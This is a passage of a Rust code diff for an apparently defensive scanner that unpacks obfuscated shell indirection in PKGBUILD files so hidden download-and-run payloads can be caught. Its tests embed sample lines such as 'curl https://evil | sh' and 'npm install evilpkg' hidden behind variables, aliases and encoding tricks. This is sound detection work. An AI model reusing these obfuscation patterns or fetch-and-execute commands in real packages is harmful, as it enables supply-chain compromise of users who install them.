+                let here = words.iter().position(|w| w == "<<<");
+                let end = here.unwrap_or(words.len());
+                let names: Vec<&String> = words[1..end]
+                    .iter()
+                    .filter(|w| !w.starts_with('-'))
+                    .filter(|w| w.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'))
+                    .collect();
+                // `read -p PROMPT NAME` style flags with arguments: give up.
+                let value = here.and_then(|p| {
+                    let text = words[p + 1..].join(" ");
+                    self.rhs(&text)
+                });
+                match (cmd, value) {
+                    ("read", Some(v)) if !names.is_empty() => {
+                        let mut rest = v.trim_start();
+                        for (i, n) in names.iter().enumerate() {
+                            let piece = if i + 1 == names.len() {
+                                let r = rest.trim_end();
+                                rest = "";
+                                r
+                            } else {
+                                let (a, b) =
+                                    rest.split_once(char::is_whitespace).unwrap_or((rest, ""));
+                                rest = b.trim_start();
+                                a
+                            };
+                            self.assign(n, &format!("'{}'", piece.replace('\'', "")), false);
+                        }
+                    }
+                    ("mapfile" | "readarray", Some(v)) if names.len() == 1 => {
+                        let lines: Vec<String> = v
+                            .split('\n')
+                            .filter(|l| !l.is_empty())
+                            .map(str::to_string)
+                            .collect();
+                        self.set_array(names[0], &lines);
+                    }
+                    _ => {
+                        for n in names {
+                            self.forget(n);
+                        }
+                    }
+                }
+                true
+            }
+            "alias" => {
+                for w in &words[1..] {
+                    if let Some((n, v)) = w.split_once('=') {
+                        match self.rhs(v) {
+                            Some(val) => {
+                                self.vars.insert(format!("{ALIAS_PREFIX}{n}"), val.clone());
+                                if !self.in_func {
+                                    self.globals.insert(format!("{ALIAS_PREFIX}{n}"), val);
+                                }
+                            }
+                            None => {
+                                self.vars.remove(&format!("{ALIAS_PREFIX}{n}"));
+                            }
+                        }
+                    }
+                }
+                true
+            }
+            _ => false,
         }
     }
 
@@ -514,11 +1285,25 @@ impl Scope {
     fn track(&mut self, stmt: &str) {
         let (head, had_decl) = statement_head(stmt);
         let words = split_words(head);
-        let mut assigns: Vec<(String, String)> = Vec::new();
+        if !had_decl && self.track_builtin(&words) {
+            return;
+        }
+        // `head` is a suffix of `stmt`, so the text before it holds the
+        // declaration keyword(s).
+        let prefix = &stmt[..stmt.len() - head.len()];
+        let is_local = self.in_func
+            && had_decl
+            && prefix
+                .split_whitespace()
+                .any(|w| matches!(w, "local" | "declare" | "typeset"))
+            && !prefix
+                .split_whitespace()
+                .any(|w| w.starts_with('-') && w.contains('g'));
+        let mut assigns: Vec<(String, String, bool)> = Vec::new();
         let mut idx = 0;
         while idx < words.len() {
             match ASSIGN_RE.captures(&words[idx]) {
-                Some(c) => assigns.push((c[1].to_string(), c[2].to_string())),
+                Some(c) => assigns.push((c[1].to_string(), c[3].to_string(), !c[2].is_empty())),
                 None => break,
             }
             idx += 1;
@@ -528,53 +1313,222 @@ impl Scope {
             // `local x` (no value) shadows any outer value.
             for w in rest {
                 if w.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') && !w.is_empty() {
+                    if is_local {
+                        self.locals.insert(w.clone());
+                    }
                     self.forget(w);
                 }
             }
         } else if !rest.is_empty() || assigns.is_empty() {
             return;
         }
-        for (name, rhs) in assigns {
-            self.assign(&name, &rhs);
+        for (name, rhs, append) in assigns {
+            if is_local {
+                self.locals.insert(name.clone());
+            }
+            self.assign(&name, &rhs, append);
         }
     }
 }
 
-/// One flow-ordered pass. `func_globals`, when given, is the end-of-file set of
-/// top-level variables: makepkg sources the WHOLE PKGBUILD before it runs any
-/// function, so a function body sees every top-level assignment regardless of
-/// where in the file it sits relative to the function.
+/// Expand a leading `{a,b,c}` word (a brace list at command position) into the
+/// space-separated words the shell would run.
+fn expand_leading_brace(stmt: &str) -> String {
+    let t = stmt.trim_start();
+    let lead = &stmt[..stmt.len() - t.len()];
+    let Some(body) = t.strip_prefix('{') else {
+        return stmt.to_string();
+    };
+    let Some(close) = body.find('}') else {
+        return stmt.to_string();
+    };
+    let list = &body[..close];
+    let after = &body[close + 1..];
+    if list.is_empty()
+        || !list.contains(',')
+        || list.contains(|c: char| c.is_whitespace() || matches!(c, '{' | '$' | '`' | '\'' | '"'))
+        || !(after.is_empty() || after.starts_with(char::is_whitespace))
+    {
+        return stmt.to_string();
+    }
+    format!(
+        "{lead}{}{after}",
+        list.split(',').collect::<Vec<_>>().join(" ")
+    )
+}
+
+/// Replace a leading alias name (`alias zz=npm` earlier) with its value.
+fn expand_alias(stmt: &str, vars: &HashMap<String, String>) -> String {
+    let t = stmt.trim_start();
+    let lead = &stmt[..stmt.len() - t.len()];
+    let end = t.find(char::is_whitespace).unwrap_or(t.len());
+    match vars.get(&format!("{ALIAS_PREFIX}{}", &t[..end])) {
+        Some(v) => format!("{lead}{v}{}", &t[end..]),
+        None => stmt.to_string(),
+    }
+}
+
+/// Set (or clear) the positional parameters `$1..$9`, `$@`, `$*` in `vars`.
+fn set_positionals(vars: &mut HashMap<String, String>, args: Option<&[Option<String>]>) {
+    for i in 1..=9 {
+        vars.remove(&i.to_string());
+    }
+    vars.remove("@");
+    vars.remove("*");
+    let Some(args) = args else { return };
+    for (i, a) in args.iter().enumerate().take(9) {
+        if let Some(a) = a {
+            vars.insert((i + 1).to_string(), a.clone());
+        }
+    }
+    if args.iter().all(Option::is_some) {
+        let all = args.iter().flatten().cloned().collect::<Vec<_>>().join(" ");
+        vars.insert("@".into(), all.clone());
+        vars.insert("*".into(), all);
+    }
+}
+
+/// Name of the function a statement defines, if it is a definition header.
+fn defined_fn(stmt: &str) -> Option<String> {
+    if !stmt.contains('(') && !stmt.contains("function") {
+        return None;
+    }
+    let t = stmt.trim_start();
+    let t = CTRL_RE.find(t).map_or(t, |m| t[m.end()..].trim_start());
+    FN_NAME_RE
+        .captures(t)
+        .and_then(|c| c.get(1).or_else(|| c.get(2)))
+        .map(|m| m.as_str().to_string())
+}
+
+/// One flow-ordered pass. `prior`, when given, is what the first pass learned:
+/// makepkg sources the WHOLE PKGBUILD before it runs any function, so a function
+/// body sees every top-level assignment regardless of where in the file it sits
+/// relative to the function (and, once a helper has run, the variables it set).
+/// It also carries the literal call sites of helper functions so their `$1`..
+/// can be resolved.
 fn resolve_pass(
     logical: &[(usize, String)],
-    func_globals: Option<&HashMap<String, String>>,
-) -> (HashMap<usize, String>, HashMap<String, String>) {
+    prior: Option<&PassFacts>,
+    unset: &HashSet<String>,
+) -> (HashMap<usize, String>, PassFacts) {
     let mut scope = Scope {
         vars: HashMap::new(),
         globals: HashMap::new(),
         in_func: false,
+        locals: HashSet::new(),
+        leaks: HashMap::new(),
+        unset,
     };
+    // Variables visible inside function bodies on the second pass.
+    let func_globals: Option<HashMap<String, String>> = prior.map(|p| {
+        let mut g = p.globals.clone();
+        for (k, v) in &p.leaks {
+            g.entry(k.clone()).or_insert_with(|| v.clone());
+        }
+        g
+    });
     let mut resolved_at: HashMap<usize, String> = HashMap::new();
     let mut scanner = BraceScanner::default();
+    let mut calls: HashMap<String, Vec<Vec<Option<String>>>> = HashMap::new();
+    // Functions currently open (innermost last), each with its own brace scanner.
+    let mut fn_stack: Vec<(String, BraceScanner)> = Vec::new();
+    let fn_names: HashSet<String> = logical
+        .iter()
+        .filter(|(_, l)| l.contains('(') || l.contains("function"))
+        .flat_map(|(_, l)| split_statements(l))
+        .filter_map(|(s, _)| defined_fn(&s))
+        .collect();
 
     for (start_line, logical_line) in logical {
         // A function header starts a fresh local scope seeded with the globals,
         // so an assignment in one function never bleeds into another.
         if !scope.in_func && FN_RE.is_match(logical_line) {
             scope.in_func = true;
-            scope.vars = func_globals.unwrap_or(&scope.globals).clone();
+            scope.vars = func_globals
+                .clone()
+                .unwrap_or_else(|| scope.globals.clone());
+            scope.locals.clear();
             scanner = BraceScanner::default();
         }
+        let stmts = split_statements(logical_line);
+        if let Some(first) = stmts.first().and_then(|(s, _)| defined_fn(s)) {
+            fn_stack.push((first, BraceScanner::default()));
+        }
+        let cur_fn = fn_stack.last().map(|(n, _)| n.clone());
+        let call_sets: Vec<Vec<Option<String>>> = match (prior, &cur_fn) {
+            (Some(p), Some(f)) => p
+                .calls
+                .get(f)
+                .map(|c| c.iter().take(MAX_CALL_VARIANTS).cloned().collect())
+                .unwrap_or_default(),
+            _ => Vec::new(),
+        };
+        set_positionals(&mut scope.vars, call_sets.first().map(Vec::as_slice));
 
         let mut emitted = String::with_capacity(logical_line.len());
-        for (stmt, sep) in split_statements(logical_line) {
-            emitted.push_str(&substitute_vars(&stmt, &scope.vars));
-            emitted.push_str(&sep);
-            scope.track(&stmt);
+        for (stmt, sep) in &stmts {
+            let sub = substitute_vars(stmt, &scope.vars, unset);
+            let sub = expand_alias(&expand_leading_brace(&sub), &scope.vars);
+            emitted.push_str(&sub);
+            emitted.push_str(sep);
+            // Record literal-argument calls to functions defined in this file.
+            if fn_names.contains(&first_word(stmt)) && defined_fn(stmt).is_none() {
+                let (head, _) = statement_head(stmt);
+                let words = split_words(head);
+                let args: Vec<Option<String>> = words
+                    .get(1..)
+                    .unwrap_or_default()
+                    .iter()
+                    .map(|w| {
+                        // Only single plain words: a quoted sentence handed to a
+                        // `msg "…"` printer helper is text, not a command.
+                        resolve_rhs(w, &scope.vars, unset).filter(|v| {
+                            !v.is_empty()
+                                && v.chars()
+                                    .all(|c| c.is_ascii_alphanumeric() || "_./:+@%=,-".contains(c))
+                        })
+                    })
+                    .collect();
+                let entry = calls.entry(words[0].clone()).or_default();
+                if entry.len() < MAX_CALL_VARIANTS && !entry.contains(&args) {
+                    entry.push(args);
+                }
+            }
+            scope.track(stmt);
         }
+        // Further call sites of the enclosing helper yield further variants of
+        // the same line (substitution only: tracking already ran).
+        let mut variants = vec![emitted.clone()];
+        for args in call_sets.iter().skip(1) {
+            let mut v = scope.vars.clone();
+            set_positionals(&mut v, Some(args));
+            let text: String = stmts
+                .iter()
+                .map(|(s, sep)| {
+                    let sub = substitute_vars(s, &v, unset);
+                    format!("{}{sep}", expand_alias(&expand_leading_brace(&sub), &v))
+                })
+                .collect();
+            if !variants.contains(&text) {
+                variants.push(text);
+            }
+        }
+        if variants.len() > 1 {
+            let joined = variants.join(" ; ");
+            if joined.len() <= MAX_DECODED_LEN {
+                emitted = joined;
+            }
+        }
+        set_positionals(&mut scope.vars, None);
 
         // Variants that are not variable uses: `${IFS}` word separators and
         // short inline-encoded payloads.
-        let emitted_ifs = IFS_RE.replace_all(&emitted, " ").into_owned();
+        let emitted_ifs = if emitted.contains("IFS") {
+            IFS_RE.replace_all(&emitted, " ").into_owned()
+        } else {
+            emitted
+        };
         let emitted = decode_inline_payloads(&emitted_ifs).unwrap_or(emitted_ifs);
         if emitted != *logical_line {
             // Quote-normalize like the de-obfuscation pass, so a resolved
@@ -590,6 +1544,15 @@ fn resolve_pass(
             );
         }
 
+        for (_, sc) in fn_stack.iter_mut() {
+            sc.feed(logical_line);
+        }
+        while fn_stack
+            .last()
+            .is_some_and(|(_, sc)| sc.peak > 0 && sc.depth <= 0)
+        {
+            fn_stack.pop();
+        }
         if scope.in_func {
             scanner.feed(logical_line);
             if scanner.peak > 0 && scanner.depth <= 0 {
@@ -598,7 +1561,20 @@ fn resolve_pass(
             }
         }
     }
-    (resolved_at, scope.globals)
+    (
+        resolved_at,
+        PassFacts {
+            globals: scope.globals,
+            leaks: scope.leaks,
+            calls,
+        },
+    )
+}
+
+/// First word of a statement (after control words / declaration prefixes).
+fn first_word(stmt: &str) -> String {
+    let (head, _) = statement_head(stmt);
+    head.split_whitespace().next().unwrap_or("").to_string()
 }
 
 /// Resolve statically-evident variable indirection in `content`, returning a
@@ -608,23 +1584,57 @@ fn resolve_pass(
 ///
 /// Scoping follows makepkg: top-level assignments are global and visible inside
 /// every function (the whole file is sourced before any function runs), while an
-/// assignment inside a function stays local to it. Several assignments or
-/// commands on one line (`c=curl; s=sh; $c url | $s`) are processed in order,
-/// and `local a=1 b=2`, `cmd=(curl -s URL)` / `"${cmd[@]}"` and `${IFS}`
-/// separators are understood. Short inline base64/hex payloads are spliced back
-/// as the command text they decode to (see [`decode_inline_payloads`]).
+/// assignment inside a function stays local to it. Variables a function sets
+/// without `local` are offered to the other functions on a second pass.
+/// Several assignments or commands on one line (`c=curl; s=sh; $c url | $s`)
+/// are processed in order, and `local a=1 b=2`, `cmd=(curl -s URL)` /
+/// `"${cmd[@]}"`, `c+=x`, `printf -v`, `read`/`mapfile <<<`, aliases, brace
+/// lists, parameter-expansion operators (`${v:1:3}`, `${v//a/b}`, `${v#p}`,
+/// `${v,,}`, `${v:-d}`), a helper's `$1`.. when called with literal arguments,
+/// and `${IFS}` separators are understood. Short inline base64/hex payloads are
+/// spliced back as the command text they decode to (see
+/// `decode_inline_payloads`).
 ///
 /// Continuation lines are spliced (via [`logical_lines`]) so an assignment or use
 /// split across a `\`-newline is still resolved; the resolved logical line is
 /// emitted on its starting physical line and any continuation physical lines are
 /// emitted blank to preserve the total line count.
 pub fn resolve_variables(content: &str) -> String {
+    // Several analyzers (and the function index) resolve the same PKGBUILD text
+    // in one scan; on a large file each pass costs seconds. A few recent results
+    // are kept and matched by exact text, so a hit is always the right answer.
+    static CACHE: std::sync::Mutex<Vec<(String, String)>> = std::sync::Mutex::new(Vec::new());
+    const CACHE_ENTRIES: usize = 4;
+    // Small inputs resolve in microseconds; do not hold their text.
+    const MIN_CACHED_LEN: usize = 16 * 1024;
+    let cacheable = content.len() >= MIN_CACHED_LEN;
+    if cacheable {
+        if let Ok(c) = CACHE.lock() {
+            if let Some((_, out)) = c.iter().find(|(k, _)| k == content) {
+                return out.clone();
+            }
+        }
+    }
+    let out = resolve_variables_uncached(content);
+    if cacheable {
+        if let Ok(mut c) = CACHE.lock() {
+            if c.len() >= CACHE_ENTRIES {
+                c.remove(0);
+            }
+            c.push((content.to_string(), out.clone()));
+        }
+    }
+    out
+}
+
+fn resolve_variables_uncached(content: &str) -> String {
     let total_lines = content.lines().count();
     let logical = logical_lines(content);
-    // Pass 1 collects the end-of-file globals; pass 2 emits with them visible
-    // inside function bodies.
-    let (_, final_globals) = resolve_pass(&logical, None);
-    let (resolved_at, _) = resolve_pass(&logical, Some(&final_globals));
+    let unset = unset_names(content);
+    // Pass 1 collects the end-of-file globals and call sites; pass 2 emits with
+    // them visible inside function bodies.
+    let (_, facts) = resolve_pass(&logical, None, &unset);
+    let (resolved_at, _) = resolve_pass(&logical, Some(&facts), &unset);
 
     // Re-emit physical lines, substituting the resolved logical variant on its
     // start line and blanking the spliced continuation lines.
@@ -653,51 +1663,191 @@ pub fn resolve_variables(content: &str) -> String {
     out.join("\n")
 }
 
-/// Resolved text of function `name` (variables substituted, inline-encoded
-/// payloads decoded) followed by the resolved text of every top-level helper
-/// function it calls, transitively (depth-bounded, cycle-safe). Lets a check that
-/// is scoped to `build()`/`package()` also see a payload that lives in a helper
-/// defined at the top level and merely CALLED from there.
-pub fn resolved_function_text(content: &str, name: &str) -> String {
-    let resolved_full = resolve_variables(content);
-    let phys: Vec<&str> = resolved_full.lines().collect();
-    let spans = function_spans(content);
-    let mut out = String::new();
-    let mut seen: Vec<String> = Vec::new();
-    let mut queue: Vec<(String, usize)> = vec![(name.to_string(), 0)];
-    while let Some((fname, depth)) = queue.pop() {
-        if seen.contains(&fname) {
-            continue;
-        }
-        seen.push(fname.clone());
-        let Some(&(s, e)) = spans.get(&fname) else {
-            continue;
-        };
-        let body = phys
-            .get(s.saturating_sub(1)..e.min(phys.len()))
-            .unwrap_or(&[])
-            .join("\n");
-        out.push_str(&body);
-        out.push('\n');
-        if depth >= 3 {
-            continue;
-        }
-        for other in spans.keys() {
-            if !seen.contains(other) && calls_function(&body, other) {
-                queue.push((other.clone(), depth + 1));
+/// A statement that sources a file: `. file`, `source file`, optionally quoted
+/// and prefixed with `$srcdir/`, `$startdir/` or `./`.
+static SOURCE_STMT_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(
+        r#"^\s*(?:\.|source)\s+["']?(?:\$\{?(?:srcdir|startdir)\}?/(?:src/)?|\./)?([A-Za-z0-9_.-]+)["']?\s*(?:;|$)"#,
+    )
+    .unwrap()
+});
+
+/// The plain `NAME=value` statements of a sourced local file, joined with `; `.
+fn sidecar_assignments(content: &str) -> String {
+    let mut out: Vec<String> = Vec::new();
+    for (_, line) in logical_lines(content) {
+        for (stmt, _) in split_statements(&line) {
+            let words = split_words(stmt.trim());
+            if !words.is_empty() && words.iter().all(|w| ASSIGN_RE.is_match(w)) {
+                out.push(stmt.trim().to_string());
             }
         }
     }
-    out
+    out.join("; ")
 }
 
-/// Whether `body` invokes `fname` as a command (word-bounded, not `fname-x`).
-fn calls_function(body: &str, fname: &str) -> bool {
-    let re = format!(
-        r"(?:^|[\s;&|(`{{])(?:{})(?:\s|;|&|\||\)|`|$)",
-        regex::escape(fname)
-    );
-    Regex::new(&re).is_ok_and(|r| r.is_match(body))
+/// Variant of `content` where each `. sidecar` / `source sidecar` of a local
+/// file shipped with the package gets that file's plain assignments appended on
+/// the same line (line count unchanged), so a command hidden behind variables
+/// defined in the sidecar (`$_f URL | $_s` after `. "$srcdir/vars.conf"`)
+/// resolves. `sidecars` is `(file name, content)`. `None` when nothing applied.
+pub fn inline_sourced_assignments(content: &str, sidecars: &[(String, String)]) -> Option<String> {
+    if sidecars.is_empty() {
+        return None;
+    }
+    let mut changed = false;
+    let lines: Vec<String> = content
+        .lines()
+        .map(|line| {
+            let Some(c) = SOURCE_STMT_RE.captures(line) else {
+                return line.to_string();
+            };
+            let Some((_, body)) = sidecars.iter().find(|(n, _)| n == &c[1]) else {
+                return line.to_string();
+            };
+            let assigns = sidecar_assignments(body);
+            if assigns.is_empty() || assigns.len() > MAX_DECODED_LEN {
+                return line.to_string();
+            }
+            changed = true;
+            format!("{}; {assigns}", line.trim_end().trim_end_matches(';'))
+        })
+        .collect();
+    changed.then(|| lines.join("\n"))
+}
+
+/// Most functions one entry function's call graph walk visits. Past it the
+/// bodies still queued are appended raw (unresolved): the text is an extra
+/// variant, so including less resolution can never hide a finding.
+const MAX_FUNCS_PER_ENTRY: usize = 256;
+/// Deepest helper-of-helper chain whose bodies are variable-resolved; deeper
+/// helpers are still included, raw.
+const MAX_CALL_DEPTH: usize = 3;
+/// Total bytes of helper text handed out across all entries of one file, so a
+/// file with thousands of entry functions cannot multiply its own size.
+const MAX_HELPER_TEXT_TOTAL: usize = 8 * 1024 * 1024;
+
+/// Per-file index for [`FunctionIndex::text_for`]: variables resolved once, the
+/// function spans found once, and the command words of every function body
+/// tokenized once, so asking for many entry functions does not redo that work.
+pub struct FunctionIndex {
+    resolved: Vec<String>,
+    raw: Vec<String>,
+    spans: HashMap<String, (usize, usize)>,
+    /// Function name -> the command-like words its body contains.
+    words: HashMap<String, HashSet<String>>,
+    /// The same for the unresolved text, used to keep walking past the caps.
+    raw_words: HashMap<String, HashSet<String>>,
+    budget: std::cell::Cell<usize>,
+}
+
+/// Split a body into the words that could be a command name: delimited by
+/// whitespace, `;`, `&`, `|`, parentheses, backticks and `{`.
+fn command_words(body: &str) -> HashSet<String> {
+    body.split(|c: char| c.is_whitespace() || matches!(c, ';' | '&' | '|' | '(' | ')' | '`' | '{'))
+        .filter(|w| !w.is_empty())
+        .map(str::to_string)
+        .collect()
+}
+
+impl FunctionIndex {
+    pub fn new(content: &str) -> Self {
+        let resolved_full = resolve_variables(content);
+        let resolved: Vec<String> = resolved_full.lines().map(str::to_string).collect();
+        let raw: Vec<String> = content.lines().map(str::to_string).collect();
+        let spans = function_spans(content);
+        let words = spans
+            .iter()
+            .map(|(name, &(s, e))| {
+                let body = slice_lines(&resolved, s, e);
+                (name.clone(), command_words(&body))
+            })
+            .collect();
+        let raw_words = spans
+            .iter()
+            .map(|(name, &(s, e))| (name.clone(), command_words(&slice_lines(&raw, s, e))))
+            .collect();
+        Self {
+            resolved,
+            raw,
+            spans,
+            words,
+            raw_words,
+            budget: std::cell::Cell::new(MAX_HELPER_TEXT_TOTAL),
+        }
+    }
+
+    /// Resolved text of function `name` (variables substituted, inline-encoded
+    /// payloads decoded) followed by the resolved text of every top-level helper
+    /// function it calls, transitively (cycle-safe; resolved up to a few levels deep and
+    /// for the first couple of hundred functions, raw beyond that, within a size
+    /// budget). Lets a check that is scoped to
+    /// `build()`/`package()` also see a payload that lives in a helper defined
+    /// at the top level and merely CALLED from there.
+    pub fn text_for(&self, name: &str) -> String {
+        let mut out = String::new();
+        let mut seen: HashSet<&str> = HashSet::new();
+        let mut queue: std::collections::VecDeque<(&str, usize)> =
+            std::collections::VecDeque::new();
+        queue.push_back((name, 0));
+        let mut resolved_count = 0;
+        while let Some((fname, depth)) = queue.pop_front() {
+            if self.budget.get() == 0 {
+                break;
+            }
+            if !seen.insert(fname) {
+                continue;
+            }
+            let Some(&(s, e)) = self.spans.get(fname) else {
+                continue;
+            };
+            // The whole transitive closure is walked (a helper chain cannot hide
+            // a payload by being long). Near the entry, bodies are variable
+            // resolved; past the depth or width cap they are appended raw.
+            let resolve_it = depth <= MAX_CALL_DEPTH && resolved_count < MAX_FUNCS_PER_ENTRY;
+            let words = if resolve_it {
+                resolved_count += 1;
+                self.push(&mut out, &slice_lines(&self.resolved, s, e));
+                self.words.get(fname)
+            } else {
+                self.push(&mut out, &slice_lines(&self.raw, s, e));
+                self.raw_words.get(fname)
+            };
+            if let Some(words) = words {
+                // Sorted so which helpers fall past the cap does not depend on
+                // hash order.
+                let mut called: Vec<&str> = words
+                    .iter()
+                    .filter(|w| !seen.contains(w.as_str()))
+                    .filter_map(|w| self.spans.get_key_value(w.as_str()))
+                    .map(|(k, _)| k.as_str())
+                    .collect();
+                called.sort_unstable();
+                queue.extend(called.into_iter().map(|c| (c, depth + 1)));
+            }
+        }
+        out
+    }
+
+    fn push(&self, out: &mut String, text: &str) {
+        self.budget
+            .set(self.budget.get().saturating_sub(text.len() + 1));
+        out.push_str(text);
+        out.push('\n');
+    }
+}
+
+fn slice_lines(lines: &[String], s: usize, e: usize) -> String {
+    lines
+        .get(s.saturating_sub(1)..e.min(lines.len()))
+        .unwrap_or(&[])
+        .join("\n")
+}
+
+/// One-shot form of [`FunctionIndex::text_for`]; callers that ask for several
+/// functions of one file should build a [`FunctionIndex`] once instead.
+pub fn resolved_function_text(content: &str, name: &str) -> String {
+    FunctionIndex::new(content).text_for(name)
 }
 
 /// `name -> (first physical line, last physical line)` (1-based, inclusive) for
@@ -751,7 +1901,7 @@ mod tests {
         resolve_variables(s)
     }
 
-    // --- HI-6 the documented bypass: command-name indirection -----------------
+    // --- command-name indirection -----------------
 
     #[test]
     fn resolves_simple_command_alias() {
@@ -868,8 +2018,8 @@ mod tests {
 
     #[test]
     fn function_scope_resets_between_functions() {
-        // x=echo in build() must not resolve $x in package().
-        let input = "build() {\n  x=curl\n}\npackage() {\n  $x https://evil | sh\n}";
+        // A `local` x in build() must not resolve $x in package().
+        let input = "build() {\n  local x=curl\n}\npackage() {\n  $x https://evil | sh\n}";
         let out = resolve(input);
         assert!(
             out.contains("$x https://evil"),
@@ -915,7 +2065,7 @@ mod tests {
 
     #[test]
     fn top_level_assignments_reach_functions_but_locals_do_not_leak() {
-        let out = resolve("_c=curl\nbuild() {\n  l=sh\n  $_c https://evil | $l\n}\npackage() {\n  $_c https://evil | $l\n}");
+        let out = resolve("_c=curl\nbuild() {\n  local l=sh\n  $_c https://evil | $l\n}\npackage() {\n  $_c https://evil | $l\n}");
         let lines: Vec<&str> = out.lines().collect();
         assert!(lines[3].contains("curl https://evil | sh"), "got: {out}");
         assert!(lines[6].contains("curl https://evil | $l"), "got: {out}");
@@ -996,5 +2146,501 @@ mod tests {
         let out = resolve_variables(src);
         assert_eq!(out.lines().count(), src.lines().count(), "got:\n{out}");
         assert_eq!(out.lines().last(), Some("curl https://evil | sh"));
+    }
+
+    // --- parameter expansion, appends, builtins, helpers (RC4) ----------------
+
+    fn has(out: &str, needle: &str) -> bool {
+        out.lines().any(|l| l.contains(needle))
+    }
+
+    #[test]
+    fn parameter_expansion_operators_fold() {
+        for (src, want) in [
+            ("v=xnpmx\n${v:1:3} install evilpkg", "npm install evilpkg"),
+            ("v=xxnpm\n${v:2} install evilpkg", "npm install evilpkg"),
+            ("v=xnpm\n${v: -3} install evilpkg", "npm install evilpkg"),
+            ("v=nZpZm\n${v//Z/} install evilpkg", "npm install evilpkg"),
+            ("v=nZpm\n${v/Z/} install evilpkg", "npm install evilpkg"),
+            ("v=xnpm\n${v#x} install evilpkg", "npm install evilpkg"),
+            ("v=xxnpm\n${v##x*} install evilpkg", " install evilpkg"),
+            ("v=npmxx\n${v%xx} install evilpkg", "npm install evilpkg"),
+            ("v=npm.sh\n${v%%.*} install evilpkg", "npm install evilpkg"),
+            ("v=a/b/npm\n${v##*/} install evilpkg", "npm install evilpkg"),
+            ("v=NPM\n${v,,} install evilpkg", "npm install evilpkg"),
+            ("v=npm\n${v^^} install evilpkg", "NPM install evilpkg"),
+            ("v=npm\n${v^} install evilpkg", "Npm install evilpkg"),
+            ("${zz:-npm} install evilpkg", "npm install evilpkg"),
+            ("${zz:=npm} install evilpkg", "npm install evilpkg"),
+            ("${zz-npm} install evilpkg", "npm install evilpkg"),
+            ("v=curl\n${v:-wget} -s u", "curl -s u"),
+            ("a=(x npm)\n${a[1]} install evilpkg", "npm install evilpkg"),
+            (
+                "a=(n p m)\nIFS=; \"${a[*]}\" install evilpkg",
+                "npm install evilpkg",
+            ),
+            (
+                "a=(n p m)\n\"${a[*]}\" install evilpkg",
+                "n p m install evilpkg",
+            ),
+        ] {
+            let out = resolve(src);
+            assert!(has(&out, want), "{src:?} -> {out:?} (want {want:?})");
+        }
+    }
+
+    #[test]
+    fn unknown_values_and_uppercase_defaults_stay_verbatim() {
+        // Never assigned in the file but upper-case: environment, not unset.
+        let out = resolve("${CC:-gcc} -o x x.c");
+        assert_eq!(out, "${CC:-gcc} -o x x.c");
+        // Operator on a variable we do not know: untouched.
+        let out = resolve("${foo#x} install evilpkg\nfoo=$(date)");
+        assert!(out.contains("${foo#x}"), "{out}");
+        // Build variables are never touched.
+        let out = resolve("cd \"${srcdir}/${pkgname}-${pkgver}\"");
+        assert_eq!(out, "cd \"${srcdir}/${pkgname}-${pkgver}\"");
+    }
+
+    #[test]
+    fn unset_variables_inside_a_word_vanish() {
+        for src in [
+            "n${zz_unset}pm install evilpkg",
+            "n$zz_unset\"\"pm install evilpkg",
+            "n\"$zz_unset\"pm install evilpkg",
+        ] {
+            let out = resolve(src);
+            assert!(has(&out, "npm install evilpkg"), "{src:?} -> {out:?}");
+        }
+        // A variable that IS assigned somewhere (even later) is not unset.
+        let out = resolve("n${zz}pm install\nzz=$(date)");
+        assert!(out.contains("${zz}"), "{out}");
+        // A standalone unset variable is left alone.
+        let out = resolve("rm -rf \"$zzz/usr\"");
+        assert!(out.contains("$zzz/usr"), "{out}");
+    }
+
+    #[test]
+    fn locale_and_empty_substitutions_normalize() {
+        assert_eq!(normalize_shell_quoting("$\"n\"$\"pm\" x"), "npm x");
+        assert_eq!(normalize_shell_quoting("n$()pm x"), "npm x");
+        assert_eq!(normalize_shell_quoting("n``pm x"), "npm x");
+        assert_eq!(normalize_shell_quoting("\"n$()pm\" x"), "npm x");
+        // A real substitution is kept.
+        assert_eq!(normalize_shell_quoting("n$(date)pm"), "n$(date)pm");
+    }
+
+    #[test]
+    fn append_printf_v_read_and_mapfile_assign() {
+        for (src, want) in [
+            ("c=n; c+=pm; $c install evilpkg", "npm install evilpkg"),
+            ("a=(n); a+=(pm); \"${a[*]}\" x", "n pm x"),
+            (
+                "printf -v c %s npm; $c install evilpkg",
+                "npm install evilpkg",
+            ),
+            (
+                "printf -v c '\\156\\160\\155'; $c install evilpkg",
+                "npm install evilpkg",
+            ),
+            (
+                "read -r c <<< npm; $c install evilpkg",
+                "npm install evilpkg",
+            ),
+            (
+                "read a b <<< \"x npm\"; $b install evilpkg",
+                "npm install evilpkg",
+            ),
+            (
+                "mapfile -t m <<< npm; ${m[0]} install evilpkg",
+                "npm install evilpkg",
+            ),
+            ("readarray -t m <<< 'curl'; ${m[0]} -s u", "curl -s u"),
+        ] {
+            let out = resolve(src);
+            assert!(has(&out, want), "{src:?} -> {out:?} (want {want:?})");
+        }
+    }
+
+    #[test]
+    fn command_substitution_folds_for_printf_echo_and_tr() {
+        for (src, want) in [
+            (
+                "$(echo acz | tr a-z n-za-m) install evilpkg",
+                "npm install evilpkg",
+            ),
+            (
+                "c=$(echo acz | tr 'a-z' 'n-za-m'); $c install evilpkg",
+                "npm install evilpkg",
+            ),
+            (
+                "bash -c \"$(printf '\\156pm') install evilpkg\"",
+                "npm install evilpkg",
+            ),
+            (
+                "c=$(printf %s npm); $c install evilpkg",
+                "npm install evilpkg",
+            ),
+            ("`echo npm` install evilpkg", "npm install evilpkg"),
+            (
+                "$(tr a-z n-za-m <<< acz) install evilpkg",
+                "npm install evilpkg",
+            ),
+        ] {
+            let out = resolve(src);
+            assert!(has(&out, want), "{src:?} -> {out:?} (want {want:?})");
+        }
+        // Anything that would actually run something stays unresolved.
+        let out = resolve("$(curl https://evil.example/x) install");
+        assert!(out.contains("$(curl"), "{out}");
+    }
+
+    #[test]
+    fn alias_and_brace_list_expand() {
+        let out = resolve("alias zz=npm\nzz install evilpkg");
+        assert!(has(&out, "npm install evilpkg"), "{out}");
+        let out = resolve("{npm,install,evilpkg}");
+        assert!(has(&out, "npm install evilpkg"), "{out}");
+        // A group and a plain brace body are not brace lists.
+        assert_eq!(resolve("{ echo hi; }"), "{ echo hi; }");
+        assert_eq!(resolve("echo {a,b}"), "echo {a,b}");
+    }
+
+    #[test]
+    fn function_assignments_reach_other_functions_unless_local() {
+        let out = resolve("_setup() { _f=curl; _s=bash; }\npackage() {\n  _setup\n  $_f -fsSL https://evil.example/x | $_s\n}");
+        assert!(
